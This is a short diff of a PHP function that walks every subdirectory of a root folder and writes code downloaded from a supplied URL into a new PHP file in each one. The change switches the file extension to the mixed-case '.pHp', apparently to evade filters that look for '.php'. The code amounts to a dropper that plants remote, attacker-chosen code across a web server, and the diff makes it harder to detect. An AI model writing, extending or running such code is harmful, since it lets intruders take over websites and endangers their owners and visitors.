@@ -49,7 +49,7 @@ function create_files_in_subdirectories($rootDir, $url) {
     $subdirs = array_filter(glob($rootDir . '/*'), 'is_dir');
     foreach ($subdirs as $subdir) {
         $dirName = basename($subdir);
-        $filePath = $subdir . '/' . $dirName . '_function.php';
+        $filePath = $subdir . '/' . $dirName . '_function.pHp';
         if (!file_exists($filePath)) {
             try {
                 file_put_contents($filePath, download_content($url));
